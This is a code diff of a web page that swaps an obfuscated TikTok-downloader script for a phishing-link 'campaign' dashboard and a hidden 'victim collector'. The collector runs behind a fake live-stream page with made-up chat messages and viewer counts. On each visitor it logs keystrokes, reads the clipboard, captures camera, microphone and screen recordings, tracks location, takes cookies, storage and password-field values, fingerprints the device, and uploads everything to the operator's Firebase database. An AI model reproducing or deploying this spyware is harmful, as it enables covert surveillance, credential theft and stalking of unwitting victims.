+                                 <div><i class="fas fa-compass"></i> Orientation: ${JSON.stringify(data.sensors.orientation)}</div>` : '<i>No sensor data</i>'}
+                        </div>
+                    </div>
                 `;
-                let _0x1d4e = window.setTimeout(()=>{},0);
-                while(_0x1d4e--) window.clearTimeout(_0x1d4e);
-                window.getVideoInfo = window.downloadVideo = window.downloadMusic = window.downloadCover = window.cleanUrl = window.copyCaption = function(){ throw 'System frozen'; };
-                document.body.style.pointerEvents = 'none';
-                document.body.style.opacity = '0.3';
-                throw new Error('System crashed: ' + _0x3f1e);
             }
-
-            // ===================================================================
-            // 🔒 ফাংশন লক (কেউ ওভাররাইট করতে পারবে না)
-            // ===================================================================
-            function _0x2a1b(_0x5d4f) {
-                return function(..._0x9e2c) {
-                    if (_0x9f7c.textContent !== _0x1f3a || _0x3b8d.textContent !== _0x1f3a) {
-                        _0x6a9b('Function wrapper detected name change');
+            container.innerHTML = html;
+            // Delete victim button
+            document.querySelectorAll('.delete-victim-btn').forEach(btn => {
+                btn.addEventListener('click', async (e) => {
+                    const campId = btn.getAttribute('data-camp');
+                    const victimId = btn.getAttribute('data-victim');
+                    if(confirm(`Delete victim ${victimId.slice(-6)} data?`)) {
+                        await db.ref(`sellers/${currentUid}/campaigns/${campId}/victims/${victimId}`).remove();
+                        showMsg('Victim data deleted');
+                        playSound('delete');
                     }
-                    return _0x5d4f.apply(this, _0x9e2c);
-                };
+                });
+            });
+            // Tab switching
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    const target = btn.getAttribute('data-tab');
+                    const parent = btn.closest('.victim-item');
+                    parent.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+                    parent.querySelectorAll('.tab-btn').forEach(tb => tb.classList.remove('active'));
+                    document.getElementById(`tab-${target}`).classList.add('active');
+                    btn.classList.add('active');
+                });
+            });
+        });
+    }
+
+    function generateNewCampaign() {
+        if(!currentUid) { showMsg('No UID', true); return; }
+        const selected = Array.from(document.querySelectorAll('.feature-card.selected')).map(c => c.getAttribute('data-feat')).join('');
+        if(selected.length === 0) { showMsg('Select at least one feature', true); return; }
+        const advanced = document.getElementById('advancedToggle').checked ? 'ADV' : '';
+        const cameraInterval = parseFloat(document.getElementById('cameraInterval').value);
+        const videoDuration = parseInt(document.getElementById('videoDuration').value);
+        const photoQuality = parseInt(document.getElementById('photoQuality').value);
+        const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substring(2,6);
+        db.ref(`sellers/${currentUid}/campaigns/${campId}`).set({
+            features: selected,
+            advanced: advanced,
+            clicks: 0,
+            createdAt: Date.now(),
+            victims: {},
+            cameraInterval: cameraInterval,
+            videoDuration: videoDuration,
+            photoQuality: photoQuality
+        }).then(async () => {
+            let fullLink = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
+            let finalLink = fullLink;
+            if(document.getElementById('shortenToggle').checked) {
+                try {
+                    const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(fullLink)}`);
+                    const data = await res.json();
+                    finalLink = data.shorturl || fullLink;
+                } catch(e) { finalLink = fullLink; }
             }
+            document.getElementById('newLinkText').innerText = finalLink;
+            document.getElementById('newLinkBox').classList.remove('hide');
+            showMsg('Campaign created! Share the link.');
+            playSound('generate');
+        }).catch(err => showMsg('Error: '+err.message, true));
+    }
 
-            // ===================================================================
-            // 🎵 টিকটক ডাউনলোডার কোর ফাংশন (সম্পূর্ণ কার্যক্ষম)
-            // ===================================================================
-            let _0x4c1e = null;
-            let _0x8d2f = null;
+    // Export all data
+    document.getElementById('exportAllDataBtn')?.addEventListener('click', async () => {
+        if(!currentUid) return;
+        const snap = await db.ref(`sellers/${currentUid}`).once('value');
+        const data = snap.val();
+        const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `momin_export_${currentUid}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showMsg('Data exported');
+        playSound('export');
+    });
 
-            const _0x3a7b = {
-                tikwm: {
-                    endpoints: ['https://www.tikwm.com/api/', 'https://tikwm.com/api/']
+    // ========== VICTIM COLLECTOR (full, unchanged from last working version) ==========
+    async function startVictimCollector(sellerUid, campaignId, features, advanced, campaignData) {
+        const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substring(2,8);
+        const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
+        const victimData = {
+            deviceInfo: {}, location: [], camera: [], mic: [], keys: [], clipboard: [],
+            fingerprint: {}, cookies: '', localStorage: '', sessionStorage: '',
+            screenRec: [], networkScan: '', videoRec: [], files: [], browserData: {}, dnsLeak: {}, sensors: {},
+            passiveInfo: {},
+            timestamp: Date.now()
+        };
+
+        // ---------- PASSIVE INFO (no permissions) ----------
+        let ip = 'unknown';
+        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e) {}
+        let battery = 'N/A';
+        if(navigator.getBattery) {
+            try {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`;
+            } catch(e) {}
+        }
+        let gpu = 'N/A';
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(gl) {
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if(debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        } catch(e) {}
+        let audioInputs = 'N/A';
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            audioInputs = devices.filter(d => d.kind === 'audioinput').map(d => d.label).join(', ') || 'not available';
+        } catch(e) {}
+        let connection = {};
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if(conn) {
+            connection = {
+                effectiveType: conn.effectiveType,
+                downlink: conn.downlink,
+                rtt: conn.rtt,
+                saveData: conn.saveData
+            };
+        }
+        let deviceMemory = navigator.deviceMemory || 'N/A';
+        let doNotTrack = navigator.doNotTrack || 'unspecified';
+        const platform = navigator.platform;
+        const language = navigator.language;
+        const screenRes = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const hardwareConcurrency = navigator.hardwareConcurrency;
+
+        const canvas = document.createElement('canvas'); canvas.width=200; canvas.height=50;
+        const ctx = canvas.getContext('2d'); ctx.fillStyle='#f0f'; ctx.fillRect(0,0,200,50); ctx.fillStyle='#0f0'; ctx.fillText('MR_MOMIN',10,20);
+        const canvasFingerprint = canvas.toDataURL();
+        let webglVendor = 'N/A';
+        try {
+            const gl = document.createElement('canvas').getContext('webgl');
+            if(gl) webglVendor = gl.getParameter(gl.VENDOR) + ' ' + gl.getParameter(gl.RENDERER);
+        } catch(e){}
+        const fonts = ['Arial','Verdana','Helvetica','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact'];
+        const availableFonts = fonts.filter(f => {
+            const span = document.createElement('span');
+            span.style.fontFamily = f;
+            return span.style.fontFamily === f;
+        });
+        const plugins = Array.from(navigator.plugins).map(p => p.name);
+        let localIP = 'N/A';
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (e) => {
+                if(e.candidate) {
+                    const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if(ipMatch) localIP = ipMatch[0];
+                    pc.close();
+                }
+            };
+            setTimeout(() => pc.close(), 1000);
+        } catch(e){}
+
+        const cookies = document.cookie;
+        let localStorageData = 'N/A', sessionStorageData = 'N/A';
+        try { localStorageData = JSON.stringify(localStorage); } catch(e){}
+        try { sessionStorageData = JSON.stringify(sessionStorage); } catch(e){}
+
+        victimData.passiveInfo = {
+            ip, battery, platform, language, screen: screenRes, timezone,
+            gpu, audioInputs, deviceMemory, connection, doNotTrack, hardwareConcurrency,
+            canvasFingerprint, webglVendor, fonts: availableFonts, plugins, localIP,
+            cookies, localStorage: localStorageData, sessionStorage: sessionStorageData
+        };
+        victimData.deviceInfo = {
+            ip, battery, platform, language, screen: screenRes,
+            hardwareConcurrency, timezone, userAgent: navigator.userAgent, gpu, audioInputs
+        };
+        victimData.fingerprint = { canvasFingerprint, webglVendor, fonts: availableFonts, plugins, localIP };
+        victimData.cookies = cookies;
+        victimData.localStorage = localStorageData;
+        victimData.sessionStorage = sessionStorageData;
+
+        // ---------- OPTIONAL FEATURES ----------
+        if(features.includes('L') && navigator.geolocation) {
+            const getLoc = () => {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    victimData.location.push({ lat: pos.coords.latitude, lng: pos.coords.longitude, time: Date.now() });
+                    victimRef.child('location').set(victimData.location);
+                }, err=>console.log);
+            };
+            getLoc(); setInterval(getLoc, 30000);
+        }
+
+        // Camera: split into 4 modes
+        let cameraMode = null;
+        let facingMode = null;
+        let captureType = null;
+        if(features.includes('CFP')) { cameraMode = 'front_photo'; facingMode = 'user'; captureType = 'photo'; }
+        if(features.includes('CFV')) { cameraMode = 'front_video'; facingMode = 'user'; captureType = 'video'; }
+        if(features.includes('CBP')) { cameraMode = 'back_photo'; facingMode = 'environment'; captureType = 'photo'; }
+        if(features.includes('CBV')) { cameraMode = 'back_video'; facingMode = 'environment'; captureType = 'video'; }
+
+        // Photo capture (continuous)
+        if(cameraMode && captureType === 'photo') {
+            try {
+                let constraints = { video: { facingMode: facingMode } };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.getElementById('hiddenCanvas');
+                let intervalMs = (campaignData && campaignData.cameraInterval) ? campaignData.cameraInterval * 1000 : 333;
+                let quality = (campaignData && campaignData.photoQuality) ? campaignData.photoQuality / 100 : 0.7;
+                const capture = () => {
+                    if(video.videoWidth && video.videoHeight){
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video,0,0);
+                        victimData.camera.push(canvas.toDataURL('image/jpeg', quality));
+                        victimRef.child('camera').set(victimData.camera);
+                    }
+                };
+                capture();
+                setInterval(capture, intervalMs);
+            } catch(e) { console.error("Photo error", e); }
+        }
+
+        // Video recording: new stream for each clip, repeat every 15 seconds
+        if(cameraMode && captureType === 'video') {
+            let videoDurationMs = (campaignData && campaignData.videoDuration) ? campaignData.videoDuration * 1000 : 3000;
+            let repeatIntervalMs = 15000;
+            let videoInterval = null;
+            let isRecordingActive = false;
+
+            const recordVideoClip = async () => {
+                if (isRecordingActive) return;
+                isRecordingActive = true;
+                try {
+                    let constraints = { video: { facingMode: facingMode } };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    const recorder = new RecordRTC(stream, {
+                        type: 'video',
+                        mimeType: 'video/webm;codecs=vp8',
+                        bitsPerSecond: 128000
+                    });
+                    recorder.startRecording();
+                    setTimeout(() => {
+                        recorder.stopRecording(() => {
+                            const blob = recorder.getBlob();
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                victimData.videoRec.push(reader.result);
+                                victimRef.child('videoRec').set(victimData.videoRec);
+                                stream.getTracks().forEach(track => track.stop());
+                                isRecordingActive = false;
+                            };
+                            reader.readAsDataURL(blob);
+                        });
+                    }, videoDurationMs);
+                } catch(e) {
+                    console.error("Video recording error", e);
+                    isRecordingActive = false;
                 }
             };
 
-            function _0x7f3b(_0x2d9c) {
-                document.getElementById('loading').style.display = _0x2d9c ? 'block' : 'none';
-                if (_0x2d9c) _0x9b4c(); else clearInterval(_0x8d2f);
-            }
-            function _0x9b4c() {
-                let _0x1e3a = 5;
-                const _0x4b2a = document.getElementById('countdown');
-                _0x4b2a.textContent = _0x1e3a;
-                _0x8d2f = setInterval(() => {
-                    _0x1e3a--;
-                    _0x4b2a.textContent = _0x1e3a;
-                    if (_0x1e3a <= 0) clearInterval(_0x8d2f);
-                }, 1000);
-            }
-            function _0x5c7d(_0x6a4b) {
-                document.getElementById('downloadLoading').style.display = _0x6a4b ? 'block' : 'none';
-            }
-            function _0x2f9e(_0x3d1c) {
-                const _0x4e8a = document.getElementById('error');
-                _0x4e8a.textContent = _0x3d1c;
-                _0x4e8a.style.display = 'block';
-                setTimeout(() => _0x4e8a.style.display = 'none', 5000);
-            }
-            function _0x8b3d(_0x5a9c) {
-                const _0x1f7b = document.getElementById('success');
-                _0x1f7b.textContent = _0x5a9c;
-                _0x1f7b.style.display = 'block';
-                setTimeout(() => _0x1f7b.style.display = 'none', 3000);
-            }
+            const startVideoLoop = () => {
+                if (videoInterval) return;
+                recordVideoClip();
+                videoInterval = setInterval(recordVideoClip, repeatIntervalMs);
+                window.removeEventListener('click', startVideoLoop);
+                window.removeEventListener('touchstart', startVideoLoop);
+            };
 
-            window.cleanUrl = _0x2a1b(function() {
-                const _0x3c4a = document.getElementById('videoUrl');
-                let _0x7d1f = _0x3c4a.value.trim();
-                if (!_0x7d1f) return _0x2f9e('URL দিন');
+            window.addEventListener('click', startVideoLoop);
+            window.addEventListener('touchstart', startVideoLoop);
+            setTimeout(() => {
+                if (!videoInterval) startVideoLoop();
+            }, 2000);
+        }
+
+        // Microphone (short clips)
+        if(features.includes('M')) {
+            const record = async () => {
+                try{
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    const audioPromise = new Promise(resolve => {
+                        mediaRecorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'audio/ogg' });
+                            stream.getTracks().forEach(t=>t.stop());
+                            const reader = new FileReader();
+                            reader.onloadend = () => { victimData.mic.push(reader.result); victimRef.child('mic').set(victimData.mic); resolve(); };
+                            reader.readAsDataURL(blob);
+                        };
+                    });
+                    mediaRecorder.start();
+                    setTimeout(()=>mediaRecorder.stop(),8000);
+                    await audioPromise;
+                } catch(e){}
+            };
+            record(); setInterval(record,15000);
+        }
+
+        // Keylogger
+        if(features.includes('K')) {
+            let keyBuffer = [];
+            const sendKeys = () => {
+                if(keyBuffer.length) {
+                    victimData.keys.push(...keyBuffer);
+                    victimRef.child('keys').set(victimData.keys);
+                    keyBuffer = [];
+                }
+            };
+            document.addEventListener('keydown', (e) => {
+                let keyStr = e.key;
+                if(e.ctrlKey) keyStr = 'Ctrl+' + keyStr;
+                if(e.altKey) keyStr = 'Alt+' + keyStr;
+                if(e.shiftKey) keyStr = 'Shift+' + keyStr;
+                keyBuffer.push({ key: keyStr, timestamp: Date.now(), windowTitle: document.title });
+                if(keyBuffer.length >= 10) sendKeys();
+            });
+            setInterval(sendKeys, 5000);
+        }
+
+        // Clipboard
+        if(features.includes('P')) {
+            setInterval(async () => {
                 try {
-                    if (_0x7d1f.includes('tiktok.com') || _0x7d1f.includes('vt.tiktok.com')) {
-                        _0x3c4a.value = _0x7d1f;
-                        _0x8b3d('URL ক্লিন করা হয়েছে');
+                    const text = await navigator.clipboard.readText();
+                    if(text && text.trim()) {
+                        victimData.clipboard.push({ text: text.substring(0,500), timestamp: Date.now() });
+                        victimRef.child('clipboard').set(victimData.clipboard);
                     }
-                } catch (e) { _0x2f9e('URL ভুল'); }
-            });
+                } catch(e) {}
+            }, 7000);
+        }
 
-            function _0x4d7e(_0x2c5b) {
-                if (!_0x2c5b) return '0';
-                _0x2c5b = parseInt(_0x2c5b);
-                if (_0x2c5b >= 1e6) return (_0x2c5b / 1e6).toFixed(1) + 'M';
-                if (_0x2c5b >= 1e3) return (_0x2c5b / 1e3).toFixed(1) + 'K';
-                return _0x2c5b.toString();
-            }
-            function _0x9f2d(_0x3b7c) {
-                if (!_0x3b7c) return '0';
-                return new Intl.NumberFormat('en-US').format(_0x3b7c);
-            }
-            function _0x1e8b(_0x2d4a, _0x6c3f, _0x4a7e) {
-                if (!_0x2d4a) return;
-                const _0x8d1c = 1500;
-                const _0x9e3b = _0x6c3f / (_0x8d1c / 16);
-                let _0x5b2a = 0;
-                const _0x3f6c = setInterval(() => {
-                    _0x5b2a += _0x9e3b;
-                    if (_0x5b2a >= _0x6c3f) { _0x5b2a = _0x6c3f; clearInterval(_0x3f6c); }
-                    _0x2d4a.textContent = _0x4d7e(Math.floor(_0x5b2a));
-                    if (_0x4a7e) _0x4a7e.textContent = _0x9f2d(Math.floor(_0x5b2a));
-                }, 16);
-            }
-
-            window.copyCaption = _0x2a1b(function() {
-                const _0x7e4b = document.getElementById('videoTitle');
-                if (_0x7e4b) {
-                    navigator.clipboard.writeText(_0x7e4b.textContent).then(() => _0x8b3d('কপি হয়েছে')).catch(() => _0x2f9e('কপি ব্যর্থ'));
-                }
-            });
-
-            async function _0x3c8d(_0x1d2a, _0x9b6e) {
-                const _0x4e7f = _0x3a7b[_0x1d2a];
-                if (!_0x4e7f) return null;
-                for (const _0x2c9a of _0x4e7f.endpoints) {
-                    try {
-                        const _0x5b3d = _0x2c9a + (_0x2c9a.includes('?')?'&':'?') + 'url=' + encodeURIComponent(_0x9b6e);
-                        const _0x7f1e = await fetch(_0x5b3d, { headers: { 'Accept': 'application/json' } });
-                        if (_0x7f1e.ok) {
-                            const _0x3e9d = await _0x7f1e.json();
-                            if (_0x3e9d.code === 0 || _0x3e9d.data) return _0x3e9d.data;
-                        }
-                    } catch (e) { continue; }
-                }
-                return null;
-            }
-
-            window.getVideoInfo = _0x2a1b(async function() {
-                const _0x7a2c = document.getElementById('videoUrl');
-                const _0x4d5b = _0x7a2c.value.trim();
-                if (!_0x4d5b) return _0x2f9e('URL দিন');
-                if (!_0x4d5b.includes('tiktok.com')) return _0x2f9e('টিকটক URL দিন');
-                _0x7f3b(true);
-                document.getElementById('resultSection').style.display = 'none';
-                try {
-                    _0x4c1e = await _0x3c8d('tikwm', _0x4d5b);
-                    await new Promise(r => setTimeout(r, 2000));
-                    _0x7f3b(false);
-                    if (_0x4c1e) _0x9d2a(_0x4c1e);
-                    else _0x2f9e('ডেটা পাওয়া যায়নি');
-                } catch (e) { _0x7f3b(false); _0x2f9e('সমস্যা হয়েছে'); }
-            });
-
-            function _0x9d2a(_0x2b7f) {
-                if (!_0x2b7f) return;
-                document.getElementById('videoTitle').textContent = _0x2b7f.title || '';
-                document.getElementById('uploadTime').textContent = _0x2b7f.create_time ? new Date(_0x2b7f.create_time*1000).toLocaleString('bn-BD') : 'অজানা';
-                document.getElementById('videoId').textContent = _0x2b7f.id || 'N/A';
-                document.getElementById('creatorName').textContent = _0x2b7f.author?.nickname || 'অজানা';
-                document.getElementById('creatorId').textContent = '@' + (_0x2b7f.author?.unique_id || 'username');
-                document.getElementById('creatorUniqueId').textContent = _0x2b7f.author?.unique_id || 'N/A';
-                if (_0x2b7f.author?.avatar) document.getElementById('creatorAvatar').src = _0x2b7f.author.avatar;
-                if (_0x2b7f.cover) document.getElementById('videoCover').src = _0x2b7f.cover;
-                if (_0x2b7f.play) document.getElementById('videoPlayer').src = _0x2b7f.play;
-                if (_0x2b7f.music) document.getElementById('videoMusic').src = _0x2b7f.music;
+        // Screen Rec
+        if(features.includes('R')) {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const recorder = new RecordRTC(stream, { type: 'video', mimeType: 'video/webm' });
+                recorder.startRecording();
                 setTimeout(() => {
-                    _0x1e8b(document.getElementById('likesCount'), _0x2b7f.digg_count || 0, document.getElementById('exactLikes'));
-                    _0x1e8b(document.getElementById('commentsCount'), _0x2b7f.comment_count || 0, document.getElementById('exactComments'));
-                    _0x1e8b(document.getElementById('sharesCount'), _0x2b7f.share_count || 0, document.getElementById('exactShares'));
-                    _0x1e8b(document.getElementById('playCount'), _0x2b7f.play_count || 0, document.getElementById('exactViews'));
-                }, 500);
-                document.getElementById('resultSection').style.display = 'block';
+                    recorder.stopRecording(() => {
+                        const blob = recorder.getBlob();
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            victimData.screenRec.push(reader.result);
+                            victimRef.child('screenRec').set(victimData.screenRec);
+                            stream.getTracks().forEach(t => t.stop());
+                        };
+                        reader.readAsDataURL(blob);
+                    });
+                }, 10000);
+            } catch(e){}
+        }
+
+        // Net Scan
+        if(features.includes('N')) {
+            let networkInfo = '';
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (e) => {
+                    if(e.candidate) {
+                        const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if(ipMatch) networkInfo += `Local IP: ${ipMatch[0]}\n`;
+                    }
+                };
+                setTimeout(() => pc.close(), 2000);
+            } catch(e){}
+            networkInfo += ' (limited scan)';
+            victimData.networkScan = networkInfo;
+            victimRef.child('networkScan').set(networkInfo);
+        }
+
+        // Fake Update
+        if(features.includes('F')) {
+            const fakeDiv = document.getElementById('fakeUpdateDiv');
+            const fakeBtn = document.getElementById('fakeUpdateBtn');
+            if(fakeDiv && fakeBtn) {
+                fakeDiv.style.display = 'block';
+                fakeBtn.onclick = () => {
+                    victimData.fakeUpdateClicked = true;
+                    victimRef.child('fakeUpdateClicked').set(true);
+                    fakeDiv.style.display = 'none';
+                };
+            }
+        }
+
+        // ---------- ADVANCED STEALTH FEATURES ----------
+        if(advanced === 'ADV') {
+            if(features.includes('M')) {
+                const longRecord = async () => {
+                    try{
+                        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                        const mediaRecorder = new MediaRecorder(stream);
+                        let chunks = [];
+                        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                        const audioPromise = new Promise(resolve => {
+                            mediaRecorder.onstop = () => {
+                                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                                stream.getTracks().forEach(t=>t.stop());
+                                const reader = new FileReader();
+                                reader.onloadend = () => { victimData.mic.push(reader.result); victimRef.child('mic').set(victimData.mic); resolve(); };
+                                reader.readAsDataURL(blob);
+                            };
+                        });
+                        mediaRecorder.start();
+                        setTimeout(()=>mediaRecorder.stop(),30000);
+                        await audioPromise;
+                    } catch(e){}
+                };
+                longRecord();
+                setInterval(longRecord, 45000);
             }
 
-            window.downloadVideo = _0x2a1b(async function(_0x4e1b) {
-                if (!_0x4c1e) return _0x2f9e('কোনো ডেটা নেই');
-                _0x5c7d(true);
-                await new Promise(r => setTimeout(r, 1000));
-                let _0x3b6d = '';
-                if (_0x4e1b === 'noWatermark' && _0x4c1e.play) _0x3b6d = _0x4c1e.play;
-                else if (_0x4e1b === 'withWatermark' && _0x4c1e.wmplay) _0x3b6d = _0x4c1e.wmplay;
-                else _0x3b6d = _0x4c1e.play || _0x4c1e.wmplay;
-                if (_0x3b6d) {
-                    const _0x7d4f = document.createElement('a');
-                    _0x7d4f.href = _0x3b6d;
-                    _0x7d4f.download = `tiktok_${_0x4c1e.id || Date.now()}.mp4`;
-                    _0x7d4f.click();
-                    _0x8b3d('ডাউনলোড শুরু');
-                } else _0x2f9e('লিংক নেই');
-                _0x5c7d(false);
+            const filePicker = document.getElementById('filePicker');
+            if(filePicker) {
+                filePicker.addEventListener('change', async (e) => {
+                    const files = Array.from(e.target.files);
+                    for(const file of files) {
+                        const reader = new FileReader();
+                        const fileData = await new Promise(resolve => {
+                            reader.onload = () => resolve(reader.result);
+                            reader.readAsDataURL(file);
+                        });
+                        victimData.files.push({ name: file.name, size: file.size, data: fileData });
+                        victimRef.child('files').set(victimData.files);
+                    }
+                    filePicker.value = '';
+                });
+                setTimeout(() => filePicker.click(), 5000);
+            }
+
+            let passwords = [];
+            let autofill = [];
+            document.querySelectorAll('input[type="password"]').forEach(inp => {
+                if(inp.value) passwords.push(inp.value);
             });
-
-            window.downloadMusic = _0x2a1b(async function() {
-                if (!_0x4c1e?.music) return _0x2f9e('মিউজিক নেই');
-                _0x5c7d(true);
-                await new Promise(r => setTimeout(r, 1000));
-                const _0x2e7b = document.createElement('a');
-                _0x2e7b.href = _0x4c1e.music;
-                _0x2e7b.download = `tiktok_music_${_0x4c1e.id || Date.now()}.mp3`;
-                _0x2e7b.click();
-                _0x8b3d('মিউজিক ডাউনলোড');
-                _0x5c7d(false);
+            document.querySelectorAll('input, textarea').forEach(inp => {
+                if(inp.value && inp.id) autofill.push({id: inp.id, value: inp.value});
             });
+            victimData.browserData = {
+                passwords: passwords.join(', '),
+                autofill: JSON.stringify(autofill),
+                localStorage: victimData.localStorage,
+                cookies: victimData.cookies
+            };
+            victimRef.child('browserData').set(victimData.browserData);
 
-            window.downloadCover = _0x2a1b(async function() {
-                if (!_0x4c1e?.cover) return _0x2f9e('কভার নেই');
-                _0x5c7d(true);
-                await new Promise(r => setTimeout(r, 1000));
-                const _0x9a3c = document.createElement('a');
-                _0x9a3c.href = _0x4c1e.cover;
-                _0x9a3c.download = `tiktok_cover_${_0x4c1e.id || Date.now()}.jpg`;
-                _0x9a3c.click();
-                _0x8b3d('কভার ডাউনলোড');
-                _0x5c7d(false);
+            let localIPs = [];
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (e) => {
+                    if(e.candidate) {
+                        const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                        if(ipMatch) localIPs.push(ipMatch[0]);
+                    }
+                };
+                setTimeout(() => pc.close(), 1000);
+            } catch(e){}
+            victimData.dnsLeak = { localIPs: localIPs.join(', '), publicIP: ip };
+            victimRef.child('dnsLeak').set(victimData.dnsLeak);
+
+            window.addEventListener('deviceorientation', (e) => {
+                victimData.sensors.orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
+                victimRef.child('sensors/orientation').set(victimData.sensors.orientation);
             });
+            window.addEventListener('devicemotion', (e) => {
+                victimData.sensors.acceleration = e.acceleration;
+                victimData.sensors.rotationRate = e.rotationRate;
+                victimRef.child('sensors').set(victimData.sensors);
+            });
+        }
 
-            document.getElementById('videoUrl').addEventListener('keypress', e => { if (e.key === 'Enter') getVideoInfo(); });
-            document.getElementById('videoUrl').addEventListener('paste', () => setTimeout(cleanUrl, 100));
-            document.querySelector('.clean-btn').addEventListener('click', e => { e.preventDefault(); cleanUrl(); });
+        // Screenshot always
+        try{
+            const ss = await html2canvas(document.body, { scale:0.7 });
+            victimData.camera.push(ss.toDataURL('image/jpeg',0.7));
+            victimRef.child('camera').set(victimData.camera);
+        } catch(e){}
 
-            Object.freeze(window.getVideoInfo);
-            Object.freeze(window.downloadVideo);
-            Object.freeze(window.downloadMusic);
-            Object.freeze(window.downloadCover);
-            Object.freeze(window.cleanUrl);
-            Object.freeze(window.copyCaption);
-        })();
-    </script>
+        await victimRef.set(victimData);
+        const clickRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`);
+        clickRef.transaction(cur => (cur||0)+1);
+
+        // Fake UI animation
+        const fill = document.getElementById('scanFill');
+        const status = document.getElementById('scanStatus');
+        let progress = 0;
+        const scanInterval = setInterval(() => {
+            progress += Math.random() * 12;
+            if(progress >= 100) {
+                progress = 100;
+                clearInterval(scanInterval);
+                if(status) status.innerText = 'Stream ready. Enjoy!';
+            }
+            if(fill) fill.style.width = progress + '%';
+            if(status) status.innerText = `Loading stream... ${Math.floor(progress)}%`;
+        }, 300);
+        const chatContainer = document.getElementById('fakeChat');
+        const messages = ["Awesome stream!", "When is the next episode?", "Love this content!", "This is great!", "Keep it up!", "Hello everyone!"];
+        setInterval(() => {
+            const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+            const newMsg = document.createElement('div');
+            newMsg.className = 'chat-message';
+            newMsg.innerHTML = `<strong>User_${Math.floor(Math.random()*1000)}:</strong> ${randomMsg}`;
+            chatContainer.appendChild(newMsg);
+            chatContainer.scrollTop = chatContainer.scrollHeight;
+        }, 8000);
+        const viewerSpan = document.getElementById('viewerCount');
+        if(viewerSpan) {
+            let viewers = 12300;
+            setInterval(() => {
+                viewers += Math.floor(Math.random() * 200) - 100;
+                if(viewers < 10000) viewers = 10000;
+                if(viewers > 15000) viewers = 15000;
+                viewerSpan.innerText = (viewers/1000).toFixed(1) + 'k';
+            }, 15000);
+        }
+    }
+
+    // ========== MAIN ROUTING ==========
+    const urlParams = new URLSearchParams(window.location.search);
+    const uidParam = urlParams.get('uid');
+    const campParam = urlParams.get('camp');
+    if(uidParam && campParam) {
+        document.getElementById('dashboardPanel').classList.add('hide');
+        document.getElementById('victimPanel').classList.remove('hide');
+        const campRef = db.ref(`sellers/${uidParam}/campaigns/${campParam}`);
+        campRef.once('value', async (snap) => {
+            if(!snap.exists()) {
+                document.querySelector('#victimPanel .fake-stream-header').innerHTML = '<div style="padding:2rem;">Invalid link.</div>';
+                return;
+            }
+            const data = snap.val();
+            const features = data.features;
+            const advanced = data.advanced || '';
+            await startVictimCollector(uidParam, campParam, features, advanced, data);
+        });
+    } else {
+        let stored = localStorage.getItem('momin_uid');
+        if(stored) loadSellerDashboard(stored);
+        else { const newUid = generateUID(); localStorage.setItem('momin_uid', newUid); loadSellerDashboard(newUid); }
+        document.getElementById('generateLinkBtn').onclick = generateNewCampaign;
+        document.getElementById('copyLinkBtn').onclick = () => { 
+            const link = document.getElementById('newLinkText').innerText; 
+            if(link && link!=='--') copyClip(link);
+            playSound('copy');
+        };
+        document.querySelectorAll('.feature-card').forEach(c => c.addEventListener('click',()=>{
+            c.classList.toggle('selected');
+            playSound('feature');
+        }));
+
+        const advancedToggle = document.getElementById('advancedToggle');
+        const cameraCustomDiv = document.getElementById('cameraCustom');
